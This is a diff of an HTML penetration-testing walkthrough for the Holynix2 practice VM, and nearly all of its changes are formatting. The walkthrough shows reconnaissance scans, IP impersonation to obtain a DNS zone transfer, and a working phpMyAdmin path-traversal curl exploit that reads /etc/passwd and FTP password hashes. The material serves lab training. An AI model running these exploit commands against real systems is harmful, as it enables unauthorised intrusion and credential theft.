@@ -242,9 +242,9 @@
 <div>Holynix2 is an ubuntu server vmware image that was deliberately built to have security holes for the purposes of penetration testing. More of an obstacle course than a real world example. The object of the challenge is to gain root level privileges and access to personal client information.</div></blockquote>
 <div class="section" id="setting-up-the-vmware-vm">
 <h3>3.16.1.1. Setting up the VMware VM<a class="headerlink" href="#setting-up-the-vmware-vm" title="Permalink to this headline">¶</a></h3>
-<p>The VM comes packaged as <a class="reference external" href="http://download.vulnhub.com/holynix/holynix-v2.tar.bz2">holynix-v2.tar.bz2</a>, which is a tar archive containing a VMware vmdk file. If you have any setup troubles you can add the disk to an existing Linux VM, mount it, make a copy of <code class="file docutils literal"><span class="pre">/etc/shadow</span></code>, and delete the root password hash. This will provide passwordless access to holynix2 via root.</p>
+<p>The VM comes packaged as <a class="reference external" href="http://download.vulnhub.com/holynix/holynix-v2.tar.bz2">holynix-v2.tar.bz2</a>, which is a tar archive containing a VMware vmdk file. If you have any setup troubles you can add the disk to an existing Linux VM, mount it, make a copy of <code class="file docutils literal notranslate"><span class="pre">/etc/shadow</span></code>, and delete the root password hash. This will provide passwordless access to holynix2 via root.</p>
 <p>See <a class="reference internal" href="VWADP.html#vmsetup"><span class="std std-ref">Traditional VM challenge setup</span></a> for background on using the VMware vmdk file. Holynix2 is Ubuntu 8.04, x86, and 512MB memory. The network interface worked when set to “model=rtl8139” and the MAC address to 00:0C:29:13:21:B3, resulting in the IP hard-coded to 192.168.1.88. Here’s how you can create a backing store to undo any changes to the disk:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
 <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
 <span class="nv">VM</span><span class="o">=</span>holynix2
 <span class="nv">BACKING</span><span class="o">=</span><span class="nv">$VM</span>.vmdk
@@ -260,7 +260,7 @@ tar xvfj holynix-v2.tar.bz2
 </pre></div>
 </div>
 <p>Then Linux KVM could use the VM_DISK to create the holynix2 VM. The actual command the author used in Debian Linux to create the VM was:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">VM</span><span class="o">=</span>holynix2
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">VM</span><span class="o">=</span>holynix2
 <span class="nv">$SUDO</span> virt-install <span class="se">\</span>
     --network<span class="o">=</span><span class="s2">&quot;bridge=br0,mac=00:0C:29:13:21:B3,model=rtl8139&quot;</span> <span class="se">\</span>
     --name <span class="s2">&quot;</span><span class="nv">$VM</span><span class="s2">&quot;</span> --cpu host --vcpus <span class="m">1</span> --ram <span class="m">512</span> <span class="se">\</span>
@@ -284,7 +284,7 @@ tar xvfj holynix-v2.tar.bz2
 </pre></div>
 </div>
 <p>So if holynix2 were running and you wanted to “start over again”:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> virsh shutdown <span class="nv">$VM</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> virsh shutdown <span class="nv">$VM</span>
 <span class="nv">$SUDO</span> virsh undefine <span class="nv">$VM</span>
 <span class="nv">$SUDO</span> qemu-img create -f qcow2 -o <span class="nv">backing_file</span><span class="o">=</span><span class="nv">$BACKING</span>  <span class="nv">$VM_DISK</span>
 <span class="nv">$SUDO</span> virt-install <span class="se">\</span>
@@ -303,7 +303,7 @@ tar xvfj holynix-v2.tar.bz2
 <div class="section" id="directory-setup">
 <h3>3.16.2.1. Directory setup<a class="headerlink" href="#directory-setup" title="Permalink to this headline">¶</a></h3>
 <p>We’ll refer to the following directories below:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">BASE</span><span class="o">=</span><span class="nv">$HOME</span>/pentest
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">BASE</span><span class="o">=</span><span class="nv">$HOME</span>/pentest
 <span class="nv">PT</span><span class="o">=</span><span class="nv">$BASE</span>/holynix2
 <span class="nv">TOOLS</span><span class="o">=</span>dns,exploit,files,nmap,passwords,spider,sqlmap
 <span class="nb">eval</span> mkdir -p <span class="nv">$PT</span>/<span class="o">{</span><span class="nv">$TOOLS</span><span class="o">}</span>
@@ -313,7 +313,7 @@ tar xvfj holynix-v2.tar.bz2
 <div class="section" id="basic-network-reconnaisance">
 <h3>3.16.2.2. Basic network reconnaisance<a class="headerlink" href="#basic-network-reconnaisance" title="Permalink to this headline">¶</a></h3>
 <p>Start with some standard network reconnaisance looking for the vulnerable host:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
 <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
 <span class="nb">cd</span> <span class="nv">$PT</span>/nmap
 <span class="nv">NMOUT</span><span class="o">=</span>nmap
@@ -328,7 +328,7 @@ xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si"
 </pre></div>
 </div>
 <p>Running this gives us:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$ SUDO=$</span><span class="o">(</span>which sudo<span class="o">)</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$ SUDO=$</span><span class="o">(</span>which sudo<span class="o">)</span>
 <span class="gp">hacker@kali:~$</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
 <span class="gp">hacker@kali:~$ cd $</span>JOB/nmap
 <span class="gp">hacker@kali:~/pentest/holynix2/nmap$</span> <span class="nv">NMOUT</span><span class="o">=</span>nmap
@@ -348,13 +348,13 @@ xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si"
 </pre></div>
 </div>
 <p>At this point we have $TARGETS so scan them:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
 <span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.*
 xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.xml -o <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.html
 </pre></div>
 </div>
 <p>Running this gives us:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/nmap$ $</span>SUDO nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/nmap$ $</span>SUDO nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
 <span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
 <span class="hll"><span class="go">Discovered open port 80/tcp on 192.168.1.88</span>
 </span><span class="go">Discovered open port 21/tcp on 192.168.1.88</span>
@@ -412,13 +412,13 @@ xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si"
 <div class="section" id="dirb">
 <h5>3.16.2.3.2.1. dirb<a class="headerlink" href="#dirb" title="Permalink to this headline">¶</a></h5>
 <p>First scan the web server with <strong class="program">dirb</strong>:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.88
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.88
 <span class="nb">cd</span> <span class="nv">$PT</span>/spider
 dirb  http://<span class="nv">$T</span>/ -o dirb.txt
 </pre></div>
 </div>
 <p>The results of the scan were:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/spider$</span> cat dirb.txt
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/spider$</span> cat dirb.txt
 
 <span class="go">-----------------</span>
 <span class="go">DIRB v2.21</span>
@@ -449,13 +449,13 @@ dirb  http://<span class="nv">$T</span>/ -o dirb.txt
 <div class="section" id="nikto">
 <h5>3.16.2.3.2.2. nikto<a class="headerlink" href="#nikto" title="Permalink to this headline">¶</a></h5>
 <p>Next up was a <strong class="program">nikto</strong> scan:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.88
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.88
 <span class="nb">cd</span> <span class="nv">$PT</span>/spider
 nikto -output nikto_80.txt -host <span class="nv">$T</span>
 </pre></div>
 </div>
 <p>The results of the scan were:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/spider$</span> cat nikto_80.txt
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/spider$</span> cat nikto_80.txt
 <span class="go">- Nikto v2.1.6/2.1.5</span>
 <span class="go">+ Target Host: 192.168.1.88</span>
 <span class="go">+ Target Port: 80</span>
@@ -487,7 +487,7 @@ nikto -output nikto_80.txt -host <span class="nv">$T</span>
 <li>The home page indicated users had web directories based on their name.</li>
 </ul>
 <p>Taking each of these in turn, we start with the registration form. Running the following <strong class="program">sqlmap</strong> query showed no injection vulnerability.</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.88
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.88
 <span class="nb">cd</span> <span class="nv">$PT</span>/sqlmap
 <span class="nv">URL</span><span class="o">=</span>http://<span class="nv">$T</span>/
 sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --forms --batch <span class="se">\</span>
@@ -495,7 +495,7 @@ sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class=
 </pre></div>
 </div>
 <p>Trying the phpMyAdmin page resulted in a flat rejection (403) without any redirection to a login page. Either a secret login page or access by something other than userid/password alone.</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/sqlmap$ cd $</span>PT/spider
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/sqlmap$ cd $</span>PT/spider
 <span class="gp">hacker@kali:~/pentest/holynix2/spider$</span> curl -v http://<span class="nv">$T</span>/phpMyAdmin
 <span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
 <span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
@@ -508,7 +508,7 @@ sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class=
 </pre></div>
 </div>
 <p>Finally, there is the hint DNS would allow harvesting user names:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/spider$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.88
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/spider$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.88
 <span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/spider$</span> curl --silent http://<span class="nv">$T</span>/ <span class="p">|</span> egrep <span class="s1">&#39;(nameservers|directory)&#39;</span>
 </span><span class="hll"><span class="go">Our nameservers are located at ns1.zincftp.com &amp;amp; ns2.zincftp.com&lt;br /&gt;</span>
 </span><span class="hll"><span class="go">To access your web directory navigate to &lt;b&gt;http://username.zincftp.com&lt;/b&gt;&lt;/div&gt;</span>
@@ -522,7 +522,7 @@ sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class=
 <div class="section" id="dns-zone-transfer">
 <h5>3.16.2.3.3.1. DNS zone transfer<a class="headerlink" href="#dns-zone-transfer" title="Permalink to this headline">¶</a></h5>
 <p>So a zone transfer would definitely yield usernames and possibly other useful information. But DNS zone transfers are unsurprisingly restricted:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/spider$ cd $</span>PT/dns
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/spider$ cd $</span>PT/dns
 <span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> dig axfr @<span class="nv">$T</span> zincftp.com
 </span><span class="go">; &lt;&lt;&gt;&gt; DiG 9.9.5-9-Debian &lt;&lt;&gt;&gt; axfr @192.168.1.88 zincftp.com</span>
 <span class="go">; (1 server found)</span>
@@ -530,8 +530,8 @@ sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class=
 <span class="hll"><span class="go">; Transfer failed.</span>
 </span></pre></div>
 </div>
-<p>But there’s that nonexistent NS2 &#64; 192.168.1.89 to impersonate. If there were a real NS2 running we would have to start <code class="docutils literal"><span class="pre">$SUDO</span> <span class="pre">arpspoof</span> <span class="pre">-t</span> <span class="pre">192.168.1.88</span> <span class="pre">192.168.1.89</span></code> in a separate window in order to impersonate 192.168.1.89. But that isn’t needed here as the server wasn’t up and running. So we add NS2’s address as a secondary and change the routing to $T to use NS2’s as the source address:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll"><span class="nv">ATTACKER</span><span class="o">=</span><span class="m">192</span>.168.1.104
+<p>But there’s that nonexistent NS2 &#64; 192.168.1.89 to impersonate. If there were a real NS2 running we would have to start <code class="docutils literal notranslate"><span class="pre">$SUDO</span> <span class="pre">arpspoof</span> <span class="pre">-t</span> <span class="pre">192.168.1.88</span> <span class="pre">192.168.1.89</span></code> in a separate window in order to impersonate 192.168.1.89. But that isn’t needed here as the server wasn’t up and running. So we add NS2’s address as a secondary and change the routing to $T to use NS2’s as the source address:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="nv">ATTACKER</span><span class="o">=</span><span class="m">192</span>.168.1.104
 </span><span class="hll"><span class="nv">NS2</span><span class="o">=</span><span class="m">192</span>.168.1.89
 </span><span class="hll"><span class="nv">IF</span><span class="o">=</span>eth0
 </span><span class="hll"><span class="nb">cd</span> <span class="nv">$PT</span>/dns
@@ -554,7 +554,7 @@ sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class=
 </span></pre></div>
 </div>
 <p>Running this gets the axfr zone transer:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> <span class="nv">ATTACKER</span><span class="o">=</span><span class="m">192</span>.168.1.104
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> <span class="nv">ATTACKER</span><span class="o">=</span><span class="m">192</span>.168.1.104
 </span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> <span class="nv">NS2</span><span class="o">=</span><span class="m">192</span>.168.1.89
 </span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> <span class="nv">IF</span><span class="o">=</span>eth0
 </span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$ cd $</span>PT/dns
@@ -601,12 +601,12 @@ sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class=
 <div class="section" id="what-s-in-the-dns-zone">
 <h5>3.16.2.3.3.2. What’s in the DNS zone?<a class="headerlink" href="#what-s-in-the-dns-zone" title="Permalink to this headline">¶</a></h5>
 <p>Here’s the axfr file:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/dns
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/dns
 cat dns_axfr.txt
 </pre></div>
 </div>
 <p>Running this gives us:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> cat dns_axfr.txt
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> cat dns_axfr.txt
 </span>
 <span class="hll"><span class="go">; &lt;&lt;&gt;&gt; DiG 9.8.4-rpz2+rl005.12-P1 &lt;&lt;&gt;&gt; axfr @192.168.1.88 zincftp.com</span>
 </span><span class="go">; (1 server found)</span>
@@ -676,8 +676,8 @@ Since we won’t set up an email server we will ignore for now.</li>
 <h4>3.16.2.3.4. Impersonating trusted.zincftp.com<a class="headerlink" href="#impersonating-trusted-zincftp-com" title="Permalink to this headline">¶</a></h4>
 <div class="section" id="trusted-zincftp-com-can-access-phpmyadmin">
 <h5>3.16.2.3.4.1. trusted.zincftp.com can access phpMyAdmin<a class="headerlink" href="#trusted-zincftp-com-can-access-phpmyadmin" title="Permalink to this headline">¶</a></h5>
-<p>Note - if trusted.zincftp.com is actually running you would have to start <code class="docutils literal"><span class="pre">arpspoof</span> <span class="pre">-t</span> <span class="pre">192.168.1.88</span> <span class="pre">192.168.1.34</span></code> to allow the IP impersonation. Also, be sure to use the DNS from $T (probably setting up <strong>nameserver 192.168.1.88</strong> in <code class="file docutils literal"><span class="pre">/etc/resolv.conf</span></code>). Here goes the impersonation without the <code class="docutils literal"><span class="pre">arpspoof</span></code>:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">IF</span><span class="o">=</span>eth0
+<p>Note - if trusted.zincftp.com is actually running you would have to start <code class="docutils literal notranslate"><span class="pre">arpspoof</span> <span class="pre">-t</span> <span class="pre">192.168.1.88</span> <span class="pre">192.168.1.34</span></code> to allow the IP impersonation. Also, be sure to use the DNS from $T (probably setting up <strong>nameserver 192.168.1.88</strong> in <code class="file docutils literal notranslate"><span class="pre">/etc/resolv.conf</span></code>). Here goes the impersonation without the <code class="docutils literal notranslate"><span class="pre">arpspoof</span></code>:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">IF</span><span class="o">=</span>eth0
 <span class="nv">ATTACKER</span><span class="o">=</span><span class="m">192</span>.168.1.104
 <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.88
 <span class="nv">TRUSTED</span><span class="o">=</span><span class="m">192</span>.168.1.34
@@ -695,7 +695,7 @@ curl --silent http://<span class="nv">$T</span>/phpMyAdmin/
 </pre></div>
 </div>
 <p>Running this gives:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> <span class="nv">IF</span><span class="o">=</span>eth0
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> <span class="nv">IF</span><span class="o">=</span>eth0
 <span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> <span class="nv">ATTACKER</span><span class="o">=</span><span class="m">192</span>.168.1.104
 <span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.88
 <span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> <span class="nv">TRUSTED</span><span class="o">=</span><span class="m">192</span>.168.1.34
@@ -734,12 +734,12 @@ curl --silent http://<span class="nv">$T</span>/phpMyAdmin/
 </div>
 <div class="section" id="rerunning-nikto-as-trusted-zincftp-com">
 <h5>3.16.2.3.4.2. Rerunning nikto as trusted.zincftp.com<a class="headerlink" href="#rerunning-nikto-as-trusted-zincftp-com" title="Permalink to this headline">¶</a></h5>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/spider
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/spider
 nikto -output nikto_trusted.txt -host <span class="nv">$T</span>
 </pre></div>
 </div>
 <p>Running this gives:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/exploit$ cd $</span>PT/spider
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/exploit$ cd $</span>PT/spider
 <span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/spider$</span> nikto -output nikto_trusted.txt -host <span class="nv">$T</span>
 </span><span class="go">- Nikto v2.1.6</span>
 <span class="go">---------------------------------------------------------------------------</span>
@@ -783,7 +783,7 @@ nikto -output nikto_trusted.txt -host <span class="nv">$T</span>
 <div class="section" id="phpmyadmin-file-inclusion-vulnerability">
 <h5>3.16.2.3.4.3. phpMyAdmin file inclusion vulnerability<a class="headerlink" href="#phpmyadmin-file-inclusion-vulnerability" title="Permalink to this headline">¶</a></h5>
 <p>A search for nikto’s report text “remote file inclusion” led to nmap’s <a class="reference external" href="https://nmap.org/nsedoc/scripts/http-phpmyadmin-dir-traversal.html">http-phpmyadmin-dir-traversal</a>:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/passwords
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/passwords
 <span class="nv">FILE</span><span class="o">=</span><span class="s2">&quot;/etc/passwd&quot;</span>
 <span class="nv">FILEPATH</span><span class="o">=</span><span class="s2">&quot;../../../../..</span><span class="nv">$FILE</span><span class="s2">&quot;</span>
 <span class="nv">OUTFILE</span><span class="o">=</span>passwd.txt
@@ -793,7 +793,7 @@ nmap -p80 --script http-phpmyadmin-dir-traversal <span class="se">\</span>
 </pre></div>
 </div>
 <p>Running this gives us:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/spider$ cd $</span>PT/passwords
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/spider$ cd $</span>PT/passwords
 <span class="gp">hacker@kali:~/pentest/holynix2/passwords$</span> <span class="nv">FILE</span><span class="o">=</span><span class="s2">&quot;/etc/passwd&quot;</span>
 <span class="gp">hacker@kali:~/pentest/holynix2/passwords$ FILEPATH=&quot;../../../../..$</span>FILE<span class="s2">&quot;</span>
 <span class="gp">hacker@kali:~/pentest/holynix2/passwords$</span><span class="s2"> OUTFILE=passwd.txt</span>
@@ -884,7 +884,7 @@ nmap -p80 --script http-phpmyadmin-dir-traversal <span class="se">\</span>
 </pre></div>
 </div>
 <p>The <strong class="program">curl</strong> equivalent is simply:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>curl http://<span class="nv">$T</span>/phpMyAdmin/libraries/grab_globals.lib.php? <span class="se">\</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl http://<span class="nv">$T</span>/phpMyAdmin/libraries/grab_globals.lib.php? <span class="se">\</span>
   --data usesubform<span class="o">[</span><span class="m">1</span><span class="o">]=</span><span class="m">1</span> <span class="se">\</span>
   --data subform<span class="o">[</span><span class="m">1</span><span class="o">][</span>redirect<span class="o">]=</span><span class="s2">&quot;../../../../../etc/passwd&quot;</span>
 </pre></div>
@@ -893,7 +893,7 @@ nmap -p80 --script http-phpmyadmin-dir-traversal <span class="se">\</span>
 <div class="section" id="phpmyadmin-lets-you-download-vulnerable-files-without-a-cve">
 <h5>3.16.2.3.4.4. phpMyAdmin lets you download vulnerable files without a CVE<a class="headerlink" href="#phpmyadmin-lets-you-download-vulnerable-files-without-a-cve" title="Permalink to this headline">¶</a></h5>
 <p>You don’t need a vulnerability to get an arbitrary file from phpMyAdmin. Just open up <a class="reference external" href="http://www.zincftp.com/phpMyAdmin/db_details_structure.php?db=zincftp%3Fdata">http://www.zincftp.com/phpMyAdmin/db_details_structure.php?db=zincftp%3Fdata</a> and create a new table named passwords with 1 field. On the resulting web page, name the field “password” of length (say) 100 and select “Save”. In the resulting web page change the query to “load data local infile ‘/etc/passwd’ into table passwords;” then select “Go”. (For MySQL syntax details see <a class="reference external" href="https://dev.mysql.com/doc/refman/5.0/en/load-data.html">13.2.6 LOAD DATA INFILE Syntax</a>.) To download the file select Export at the top, then in the resulting web page select “CSV”, “Save as file”, then select “Go”.</p>
-<p>For utter simplicity we’ll use the <code class="docutils literal"><span class="pre">curl</span></code> vulnerability exploitation command above, knowing that there is an equivalent that can be used when the vulnerability is not available.</p>
+<p>For utter simplicity we’ll use the <code class="docutils literal notranslate"><span class="pre">curl</span></code> vulnerability exploitation command above, knowing that there is an equivalent that can be used when the vulnerability is not available.</p>
 </div>
 </div>
 </div>
@@ -902,12 +902,12 @@ nmap -p80 --script http-phpmyadmin-dir-traversal <span class="se">\</span>
 <div class="section" id="only-5-ftp-users-can-ssh">
 <h4>3.16.2.4.1. Only 5 FTP users can SSH<a class="headerlink" href="#only-5-ftp-users-can-ssh" title="Permalink to this headline">¶</a></h4>
 <p>Let’s see which of the FTP users actually can log on via SSH:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/passwords
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/passwords
 grep <span class="s1">&#39;/bin/bash&#39;</span> passwd.txt <span class="p">|</span> grep -v <span class="s1">&#39;^root&#39;</span> <span class="p">|</span> cut -d: -f1
 </pre></div>
 </div>
 <p>Running this shows the 5 FTP users that are also SSH users:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/users$ cd $</span>PT/passwords
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/users$ cd $</span>PT/passwords
 <span class="gp">hacker@kali:~/pentest/holynix2/users$</span> grep <span class="s1">&#39;/bin/bash&#39;</span> passwd.txt <span class="p">|</span> grep -v <span class="s1">&#39;^root&#39;</span> <span class="p">|</span> cut -d: -f1
 <span class="go">lsanderson</span>
 <span class="go">cfinnerly</span>
@@ -919,8 +919,8 @@ grep <span class="s1">&#39;/bin/bash&#39;</span> passwd.txt <span class="p">|</s
 </div>
 <div class="section" id="get-pureftp-password-hashes-via-phpmyadmin">
 <h4>3.16.2.4.2. Get PureFTP password hashes via phpMyAdmin<a class="headerlink" href="#get-pureftp-password-hashes-via-phpmyadmin" title="Permalink to this headline">¶</a></h4>
-<p><a class="reference external" href="https://help.ubuntu.com/community/PureFTP">PureFTP</a> shows the default location for Ubuntu’s pure-ftpd package password file is <code class="file docutils literal"><span class="pre">/etc/pure-ftpd/pureftpd.passwd</span></code>. We know we can get the hashes via:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/passwords
+<p><a class="reference external" href="https://help.ubuntu.com/community/PureFTP">PureFTP</a> shows the default location for Ubuntu’s pure-ftpd package password file is <code class="file docutils literal notranslate"><span class="pre">/etc/pure-ftpd/pureftpd.passwd</span></code>. We know we can get the hashes via:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/passwords
 curl --silent --output pureftpd.passwd <span class="se">\</span>
   http://<span class="nv">$T</span>/phpMyAdmin/libraries/grab_globals.lib.php? <span class="se">\</span>
   --data usesubform<span class="o">[</span><span class="m">1</span><span class="o">]=</span><span class="m">1</span> <span class="se">\</span>
@@ -929,7 +929,7 @@ cat pureftpd.passwd
 </pre></div>
 </div>
 <p>Running this gives:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/passwords$ cd $</span>PT/passwords
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/passwords$ cd $</span>PT/passwords
 <span class="gp">hacker@kali:~/pentest/holynix2/passwords$</span> curl --silent --output pureftpd.passwd <span class="se">\</span>
 &gt;   http://<span class="nv">$T</span>/phpMyAdmin/libraries/grab_globals.lib.php? <span class="se">\</span>
 &gt;   --data usesubform<span class="o">[</span><span class="m">1</span><span class="o">]=</span><span class="m">1</span> <span class="se">\</span>
